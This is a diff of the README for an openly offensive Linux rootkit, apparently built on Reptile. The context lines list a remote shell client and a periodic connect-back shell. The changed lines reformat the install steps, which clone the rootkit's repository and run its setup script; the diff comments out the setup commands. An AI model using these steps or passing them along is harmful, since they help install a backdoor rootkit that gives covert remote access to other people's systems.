@@ -23,13 +23,13 @@ I really don't give two shits what you do with this rootkit it's pretty shit lol
 - Client to handle Reptile Shell
 - Shell connect back each X times (not default)
    
-#
-- Install (If you can't figure this out then you're a brain dead troglidyte)
-`
+
+
+`#Install 
 apt-get install linux-headers-$(uname -r)
 git clone https://github.com/ret2win/siph0n-rootkit.git
-cd siph0n-rootkit
-./setup.sh install `
+#cd siph0n-rootkit
+#./setup.sh install `
 
 
 - Uninstall: 
